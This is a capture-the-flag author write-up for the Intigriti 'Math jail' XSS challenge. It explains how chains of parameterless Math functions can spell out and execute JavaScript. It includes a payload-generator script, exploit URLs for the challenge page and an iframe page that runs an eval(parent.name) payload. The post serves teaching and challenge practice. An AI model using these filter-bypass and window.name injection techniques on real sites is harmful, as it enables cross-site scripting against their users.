---
title: Math jail - Intigriti 0823 XSS Challenge Author Writeup
catalog: true
date: 2023-08-29 14:10:44
tags: [Security]
categories: [Security]
photos: /img/intigriti-0823-author-writeup/cover-en.png
---

In the monthly challenges at Intigriti, I presented an XSS challenge that I named "Math Jail." You can find the challenge at the following link: https://challenge-0823.intigriti.io/

Now that the challenge has concluded, I'd like to take this opportunity to discuss the thought process behind creating the challenge and share some of the solutions that were developed.

<!-- more -->

The concept of "Math jail" originated from a challenge called "Culinary Class Room" in the Hack.lu CTF 2022. This challenge required adding numerous decorators to a Python class without any parameters, with the objective of executing arbitrary code.

Decorators are essentially function calls, which means you can only use code in the form of `a(b(c(d(e(f())))))`. How can one achieve the ability to execute any desired functionality?

Similar challenges have also appeared in Chinese CTF competitions, such as the one mentioned in this article: [PHP Parameterless RCE](https://xz.aliyun.com/t/9360).

The solution to the Culinary Class Room challenge involved finding a list, pushing multiple numbers into it, converting it to bytes, and then passing it to `eval()` for execution.

For example, the following code snippet would push the number 112 into `copyright._Printer__filenames`:

``` py
@copyright._Printer__filenames.append
@memoryview.__basicsize__.__sub__
@staticmethod.__basicsize__.__mul__
@object.__instancecheck__
class a:pass
```

Upon encountering this challenge, I wondered if it would be possible to create a JavaScript version. That's how Math jail came into existence.

Initially, there was no requirement for it to start with `Math.`, but later on, I found it more interesting to do so. Moreover, if it didn't have this restriction, one could simply execute `alert(document.domain.toString())` and be done. Filtering out many keywords and potential unintended consequences would be necessary.

Now, let's discuss the general approach to solving Math jail.

## The overall concept of the solution

The concept is similar to the Python version mentioned earlier. We need to find a list, push elements into it, and then join the elements and pass them to `eval()` for execution. Here's a general example:

``` js
var arr = []
eval(arr.join(''.toString(arr.push('a'.toString()))))
// Uncaught ReferenceError: a is not defined
```

In the above code, the variable `a` is executed. By following this concept, we can construct `alert()`. Let's take a simple example:

``` js
var arr = ['a','l','e','r']
eval(
  arr.join(
    ''.toString(
        arr.push(
          ')'.toString(
            arr.push(
              '('.toString(
                arr.push('t'.toString())
              )
            )
          )
        )
      )
  )
)
```

Since each function call cannot have parameters, expressions like `arr.join('')` can be modified to `arr.join(''.toString())` to comply with the rule.

Once we have this basic concept, the remaining questions can be divided into four parts:

1. How do we find a usable array?
2. How do we find the desired characters?
3. How do we join them?
4. How do we execute without using eval?

## 1. Finding an array

In the given challenge, there is a specific array called `Math.seeds`. By using the `pop()` method multiple times, we can empty the array. Here's an example:

``` js
Math.seeds = [1,2,3,4]
Math.seeds.pop(Math.seeds.pop(Math.seeds.pop(Math.seeds.pop())))
console.log(Math.seeds) // []
```

This way, we have an empty array `Math.seeds` that we can use to store elements.

## 2. Finding the desired characters

Firstly, we can check if the desired characters exist within `Math`. For example, `Math.abs.name` gives us the string `"abs"`, and by using `.at()` on it, `Math.abs.name.at()` would be `"a"`.

Therefore, `Math.seeds.push(Math.abs.name.at())` would make the contents of `Math.seeds` become `["a"]`.

The return value of `Array.prototype.push` is the length of the array. Hence, if we can find a function whose second letter is `'l'`, it would be optimal to reduce the number of function calls.

By now, you might have realized that manually solving this challenge would be tiresome. Automating the process would be a better approach. So, let's write a function!

We can use recursion to explore each property of accessible objects and check if it meets our desired criteria. The function implementation is as follows:

``` js
function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []

  findTarget(scope, initPath)

  // return the shortest one
  return result.sort((a, b) => a.length - b.length)[0]

  function findTarget(obj, path) {
    if(visited.has(obj)) return
    visited.add(obj)
    const list = Object.getOwnPropertyNames(obj)
    for(let key of list) {
      const item = obj[key]
      const newPath = path ? path + "." + key : key
      try {
        if (matchFn(item)) {
          result.push(newPath)
          continue
        }
      } catch(err){}
      
      if (item && typeof item === 'object') {
        findTarget(item, newPath)
      }
    }
  }
}
```

You can use the function as follows:

``` js
console.log(findTargetFromScope(Math, item => item.name.at(0) === 'a','Math'))
// Math.abs

console.log(findTargetFromScope(Math, item => item.name.at(1) === 'l','Math'))
// Math.clz32
```

We can also improve the usability by organizing it as follows:

``` js
const findMathName = (index, char) => 
    findTargetFromScope(Math, item => item.name.at(index) === char, 'Math')

console.log(findMathName(0, 'a')) // Math.abs
console.log(findMathName(1, 'l')) // Math.clz32
```

Earlier, we mentioned that we would first try to find the desired character by using the array's length. But what if we can't find it?

In that case, we can try another approach: finding it at a fixed index.

For example, `Math.LN2` is `0.69`, and when we pass a decimal number as an argument to `Array.prototype.at()`, it automatically rounds down to the nearest integer. So, it becomes `0`.

Suppose the original return value of `arr.push()` is 2. By wrapping it with `Math.LN2.valueOf(arr.push())`, we can convert the number back to 0, allowing us to use the first character to find the desired function name.

Here's an example:

``` js
Math.seeds = []
Math.seeds.push(Math.log.name.at(Math.LN2.valueOf(Math.seeds.push(Math.abs.name.at()))))
```

This code will make the contents of the array become `['a', 'l']`.

Following this approach, we can prepare a few more indices. I have prepared four:

``` js
const mapping = [
  ['Math.LN2.valueOf'], // 0
  ['Math.LOG2E.valueOf'], // 1
  ['Math.E.valueOf'], // 2
  ['Math.PI.valueOf'], // 3
]
```

At this point, we should be able to find all the English letters we need. But what about symbols like `()`? How do we handle those?

This is where we can recall the handy function [String.fromCharCode()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode). It can convert a number into a corresponding character string.

To access `String` from `Math`, we can simply find any string and access its constructor, like `Math.abs.name.constructor.fromCharCode`.

Now, the question becomes, how do we generate numbers?

Since we are already using Math, let's write a searching function that tries various combinations of Math functions!

``` js
function findTargetNumber(init, target) {
  let queue = [[[], init]]
  let visited = new Set()
  return bfs(target)

  function bfs(target) {
    while(queue.length) {
      let [path, current] = queue.shift()
      for(let key of Object.getOwnPropertyNames(Math)){
        if (typeof Math[key] !== 'function') continue
        let value = Math[key]?.(current)
        if (value && !Number.isNaN(value)) {
          let newPath = [`Math.${key}`, ...path]
          if (value === target) {
            return newPath
          }

          if (newPath.length >= 10) return

          if (!visited.has(value)) {
            visited.add(value)
            queue.push([newPath, value])
          }
        }
      }
    }
  }
}
console.log(findTargetNumber(5, '('.charCodeAt(0)))
// ['Math.floor', 'Math.log2', 'Math.cosh', 'Math.clz32']
```

When we construct `alert`, the return value of the last push operation will be 5. Since the ASCII code for `(` is 40, we can obtain 40 with the following expression: `Math.floor(Math.log2(Math.cosh(Math.clz32(5))))`.

By concatenating it with the previous code, we can obtain `(`:

``` js
Math.abs.name.constructor.fromCharCode(Math.floor(Math.log2(Math.cosh(Math.clz32(5)))))
```

Putting it all together, we can form an array with the desired characters.

## 3. How to join the array?

To join the array elements together, we need to find an empty string to transform the array into the desired string format.

Initially, my idea was to generate a whitespace character and use `" ".trim()`. However, this approach would involve function calls like `fn().trim()`, which violates the rules specified in the challenge.

Fortunately, there is another way to invoke functions: `String.prototype.trim.call(" ")`. This method allows us to obtain an empty string.

We can utilize the method we used earlier to find `(` to find the whitespace character. Finally, we can add this sequence of function calls to achieve the desired result. Here's an example:

``` js
// Assumed we already had the array
var arr = ['a','l','e','r','t','(',')']
console.log(
  arr.join(Math.abs.name.constructor.prototype.trim.call(Math.abs.name.constructor.fromCharCode(32)))
)
// alert()
```

## 4. How to execute without using eval?

Besides `eval`, we can also use the function constructor, like this:

``` js
Function('alert()')()
```

For the `Function` part, we can simply find any function and access its constructor:

``` js
Math.abs.constructor('alert()')()
```

But what about the final `()`?

Similarly, we can invoke a function in another way. For example, `alert.call()` can be written as `Function.prototype.call.call(alert)`. Therefore, the code we need is as follows:

``` js
Math.abs.constructor.call.call(Math.abs.constructor('alert()'))
```

## 5. Putting it all together

I have written a simple script to generate the code. Here is the complete code:

``` js
function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []

  findTarget(scope, initPath)

  // return the shortest one
  return result.sort((a, b) => a.length - b.length)[0]

  function findTarget(obj, path) {
    if(visited.has(obj)) return
    visited.add(obj)
    const list = Object.getOwnPropertyNames(obj)
    for(let key of list) {
      const item = obj[key]
      const newPath = path ? path + "." + key : key
      try {
        if (matchFn(item)) {
          result.push(newPath)
          continue
        }
      } catch(err){}
      
      if (item && typeof item === 'object') {
        findTarget(item, newPath)
      }
    }
  }
}

function findTargetNumber(init, target) {
  let queue = [[[], init]]
  let visited = new Set()
  return bfs(target)

  function bfs(target) {
    while(queue.length) {
      let [path, current] = queue.shift()
      for(let key of Object.getOwnPropertyNames(Math)){
        if (typeof Math[key] !== 'function') continue
        let value = Math[key]?.(current)
        if (value && !Number.isNaN(value)) {
          let newPath = [`Math.${key}`, ...path]
          if (value === target) {
            return newPath
          }

          if (newPath.length >= 10) return

          if (!visited.has(value)) {
            visited.add(value)
            queue.push([newPath, value])
          }
        }
      }
    }
  }
}

function buildExploit(arrName, content) {
  let ans = []
  let currentIndex = 0
  let codeResult = ''

  for(let i=0; i<5; i++) {
    addFunction(`${arrName}.pop`)
  }

  const findMathName = (index, char) => 
    findTargetFromScope(Math, item => item.name.at(index) === char, 'Math')
  
  for(let char of content) {

    // if we can find it in the Math for the current index, use it
    let result = findMathName(currentIndex, char)
    if (result) {
      addFunction(`${result}.name.at`)
      addFunction(`${arrName}.push`)
      currentIndex++
      continue
    }

    const mapping = [
      ['Math.LN2.valueOf'], // 0
      ['Math.LOG2E.valueOf'], // 1
      ['Math.E.valueOf'], // 2
      ['Math.PI.valueOf'], // 3
    ]

    // try to find Math.fn[i] == char
    let found = false
    for(let i=0; i<mapping.length; i++) {
      result = findMathName(i, char)
      if (result) {
        addFunction(mapping[i][0])
        addFunction(`${result}.name.at`)
        addFunction(`${arrName}.push`)
        currentIndex++
        found = true
        break
      }
    }

    if (found) {
      continue
    }

    // if we can't, we use integer to make a string
    let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0))
    mathResult.reverse() // remember to reverse cause the order
    for(let row of mathResult) {
      addFunction(row)
    }
    addFunction('Math.abs.name.constructor.fromCharCode')
    addFunction(`${arrName}.push`)
    currentIndex++
  }

  // add eval structure
  // generate space then trim
  let spaceResult = findTargetNumber(currentIndex, ' '.charCodeAt(0))
  spaceResult.reverse() // remember to reverse cause the order
  for(let row of spaceResult) {
    addFunction(row)
  }
  addFunction('Math.abs.name.constructor.fromCharCode')
  addFunction('Math.abs.name.constructor.prototype.trim.call')
  addFunction(`${arrName}.join`)
  addFunction('Math.abs.constructor')
  addFunction('Math.abs.constructor.prototype.call.call')

  return ans.reverse().join(',')
  //return codeResult

  function addFunction(name){
    ans.unshift(name)
    codeResult = `${name}(${codeResult})`
  }
}

console.log(buildExploit('Math.seeds', 'alert(document.domain)'))
```

The final result is:

``` js
Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call
```

Exploit URL: https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.abs.name.at,Math.seeds.push,Math.clz32.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.round.name.at,Math.seeds.push,Math.hypot.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.log,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.imul.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.log2,Math.exp,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.clz32,Math.sqrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.acosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call

## Arbitrary XSS

The above code merely executes the static `alert(document.domain)` command. Is it possible to execute arbitrary JavaScript code?

As long as a short enough payload can be found, it seems feasible.

For instance, `eval(location.hash.slice(1))` is relatively short, but still a bit long. If you use the script I provided above, it might hang for a while due to some bugs in my code. Ultimately, it generates a result of length 120, which exceeds the 100-character limit.

However, another payload like `eval("'"+location)` works fine and has a length of 85.

https://challenge-0823.intigriti.io/challenge/index.html?q=Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.seeds.pop,Math.exp.name.at,Math.seeds.push,Math.tan,Math.sinh,Math.sinh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.clz32,Math.cosh,Math.log2,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cosh,Math.cbrt,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.exp,Math.tan,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.expm1,Math.sqrt,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cbrt,Math.cosh,Math.expm1,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.log.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.cos.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.tan.name.at,Math.seeds.push,Math.LN2.valueOf,Math.imul.name.at,Math.seeds.push,Math.LOG2E.valueOf,Math.cos.name.at,Math.seeds.push,Math.E.valueOf,Math.min.name.at,Math.seeds.push,Math.atan,Math.sinh,Math.cosh,Math.cosh,Math.ceil,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.cos,Math.clz32,Math.abs.name.constructor.fromCharCode,Math.abs.name.constructor.prototype.trim.call,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call#';alert(document.domain+'/arb-xss')

Once the ability to execute arbitrary code is achieved, the next step is to strive to identify the shortest possible set of operations.

## Code golf time

### Shortest XSS payload

While the previous payload `eval("'"+location)` is already quite short, for this challenge, there is an even shorter payload.

I learned from @DrBrix that you can use `eval(parent.name)` to shorten the length further, and this clever technique leverages iframes.

In the challenge page, a special name was set up to ensure it doesn't get overwritten, but we can utilize it's parent page. The page `https://challenge-0823.intigriti.io/` embeds `chanllenge/index.html` using an iframe, so using `parnent.name` allows us to access the name of `https://challenge-0823.intigriti.io/`.

Thus, @DrBrix's strategy is as follows: First, create a page named exp.html, add an iframe with the name set to the payload, and replace the location with `https://challenge-0823.intigriti.io`. 

The structure becomes:

```
- exp.html (top)
--- https://challenge-0823.intigriti.io (name: 'alert(1)')
------ https://challenge-0823.intigriti.io/challenge/index.html
```

Then you can use `frames[0].frames[0]` to access the innermost iframe and redirect it to the prepared URL, resulting in:

```
- exp.html (top)
--- https://challenge-0823.intigriti.io (name: 'alert(1)')
------ https://challenge-0823.intigriti.io/challenge/index.html?q=...
```

This way, you can use `parent.name` to access the adjusted name. The code looks like this:

``` html
<script>
setTimeout(() => {
frames[0].frames[0].location.replace('https://challenge-0823.intigriti.io/challenge/index.html?q=Math.random')
},3000)</script>
<iframe srcdoc='

<script>
name = "alert(document.domain)"
document.location = "https://challenge-0823.intigriti.io/"
</script>
'>
</iframe>
```

`eval(parent.name)` is the shortest payload I could find. The second shortest is `location=parent.name`.

### Empty Math.seeds

Previously, `Math.seeds.pop()` was used to clear the content, but this part can be further shortened!

@y0d3n introduced a technique: `Math.seeds.splice(Math.imul())`.

This works because the return value of `Math.imul()` is 0, and `splice(0)` means "remove data after(and include) the first element." Therefore, the entire array is cleared.

### Get an empty string

Previously, I used a more convoluted method to generate an empty string. Later, I discovered that `Math.random.name` could yield an empty string.

This is due to this part:

``` js
Math.random = function () {
  if (!this.seeds) {
    this.seeds = [0.62536, 0.458483, 0.544523, 0.323421, 0.775465]
    next = this.seeds[new Date().getTime() % this.seeds.length]
  }
  next = next * 1103515245 + 12345
  return (next / 65536) % 32767
}
```

Notice there's no name after `function`, making it an anonymous function. So, we're assigning an anonymous function to `Math.random`, hence `Math.random.name` becomes an empty string.

### Obtaining fixed numbers

I previously used built-in constants like `Math.PI` to obtain fixed numbers. Later, I learned from @Astrid that we can use forms like `STRING.length.valueOf()` to get numbers.

For example, `Math.isPrototypeOf.name.length.valueOf()` would yield 13. Using this method, we can quickly obtain a fixed number.

Once we have a fixed number, we can find our desired number with fewer steps, and @Astrid even wrote code to find the shortest path.

### Final solution

The resulting payload is composed of 59 operations and executes `eval(parent.name)`(this requires collaboration with the previously mentioned iframe to run).

```
Math.imul,Math.seeds.splice,Math.exp.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.valueOf.name.at,Math.seeds.push,Math.atan.name.at,Math.seeds.push,Math.ceil.name.at,Math.seeds.push,Math.isPrototypeOf.name.length.valueOf,Math.log2,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.pow.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.fromCharCode.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.abs.name.constructor.prototype.codePointAt.name.at,Math.seeds.push,Math.PI.valueOf,Math.exp,Math.acosh,Math.exp,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.constructor.prototype.normalize.name.at,Math.seeds.push,Math.LN2.valueOf,Math.abs.name.at,Math.seeds.push,Math.LN2.valueOf,Math.max.name.at,Math.seeds.push,Math.LN2.valueOf,Math.exp.name.at,Math.seeds.push,Math.asinh,Math.log2,Math.tan,Math.cosh,Math.floor,Math.abs.name.constructor.fromCharCode,Math.seeds.push,Math.random.name.valueOf,Math.seeds.join,Math.abs.constructor,Math.abs.constructor.prototype.call.call
```

The script is as follows:

``` js
function findTargetFromScope(scope, matchFn, initPath='') {
  let visited = new Set()
  let result = []

  findTarget(scope, initPath)

  // return the shortest one
  return result.sort((a, b) => a.length - b.length)[0]

  function findTarget(obj, path) {
    if(visited.has(obj)) return
    visited.add(obj)
    const list = Object.getOwnPropertyNames(obj)
    for(let key of list) {
      const item = obj[key]
      const newPath = path ? path + "." + key : key
      try {
        if (matchFn(item)) {
          result.push(newPath)
          continue
        }
      } catch(err){}
      
      if (item && typeof item === 'object') {
        findTarget(item, newPath)
      }
    }
  }
}

function findTargetNumber(init, target) {
  let queue = [[[], init]]
  let visited = new Set()
  return bfs(target)

  function bfs(target) {
    while(queue.length) {
      let [path, current] = queue.shift()
      for(let key of Object.getOwnPropertyNames(Math)){
        if (typeof Math[key] !== 'function') continue
        let value = Math[key]?.(current)
        if (value && !Number.isNaN(value)) {
          let newPath = [`Math.${key}`, ...path]
          if (value === target) {
            return newPath
          }

          if (newPath.length >= 10) return

          if (!visited.has(value)) {
            visited.add(value)
            queue.push([newPath, value])
          }
        }
      }
    }
  }
}

function buildExploit(arrName, content) {
  let ans = []
  let currentIndex = 0
  let codeResult = ''

  // @credit: @y0d3n
  addFunction('Math.imul')
  addFunction('Math.seeds.splice')

  const findMathName = (index, char) =>  
    findTargetFromScope(Math, item => item.name.at(index) === char, 'Math') || findTargetFromScope(Math.abs.name.constructor, item => item.name.at(index) === char, 'Math.abs.name.constructor') 
  
  for(let char of content) {
    console.log(char)

    // if we can find it in the Math for the current index, use it
    let result = findMathName(currentIndex, char)
    if (result) {
      addFunction(`${result}.name.at`)
      addFunction(`${arrName}.push`)
      currentIndex++
      continue
    }

    const mapping = [
      ['Math.LN2.valueOf'], // 0
      ['Math.LOG2E.valueOf'], // 1
      ['Math.E.valueOf'], // 2
      ['Math.PI.valueOf'], // 3
    ]

    // try to find Math.fn[i] == char
    let found = false
    for(let i=0; i<mapping.length; i++) {
      result = findMathName(i, char)
      if (char === 'v' && !result) {
        result = 'Math.LN2.valueOf'
      }
      if (result) {
        addFunction(mapping[i][0])
        addFunction(`${result}.name.at`)
        addFunction(`${arrName}.push`)
        currentIndex++
        found = true
        break
      }
    }

    if (found) {
      continue
    }

    // @credit: @Astrid
    if (char === '(') {
      addFunction('Math.isPrototypeOf.name.length.valueOf')
      addFunction('Math.log2')
      addFunction('Math.exp')
      addFunction('Math.abs.name.constructor.fromCharCode')
      addFunction(`${arrName}.push`)
      currentIndex++
    } else if (char === '.') {
      addFunction('Math.PI.valueOf')
      addFunction('Math.exp')
      addFunction('Math.acosh')
      addFunction('Math.exp')
      addFunction('Math.abs.name.constructor.fromCharCode')
      addFunction(`${arrName}.push`)
      currentIndex++
    } else {

      let mathResult = findTargetNumber(currentIndex, char.charCodeAt(0))
      mathResult.reverse() // remember to reverse cause the order
      for(let row of mathResult) {
        addFunction(row)
      }
      addFunction('Math.abs.name.constructor.fromCharCode')
      addFunction(`${arrName}.push`)
      currentIndex++
    }
  }

  // add eval structure
  addFunction('Math.random.name.valueOf')
  addFunction(`${arrName}.join`)
  addFunction('Math.abs.constructor')
  addFunction('Math.abs.constructor.prototype.call.call')

  return ans.reverse()

  function addFunction(name){
    ans.unshift(name)
    codeResult = `${name}(${codeResult})`
  }
}

Math.seeds = []
// @credit: @DrBrix
const arr = buildExploit('Math.seeds', 'eval(parent.name)')
console.log('length:', arr.length)
console.log(arr.join(','))
```

Perhaps there might be something even shorter, but I'm too lazy to search for it.

## Conclusion

The above is the solution to the challenge and the thought process behind it.

Originally, the ideal situation was to find a usable array directly from Math, without needing `Math.seeds`. However, upon trying, it seems I couldn't find such a solution.

I've also learned a lot from other hackers' solutions, like clearing the array or achieving even shorter payloads, things I didn't anticipate when designing the challenge. Kudos to all the hackers!

I hope that everyone has learned something from this challenge and had a great time participating.

Thank you all for your participation, and I look forward to crossing paths again in future challenges!
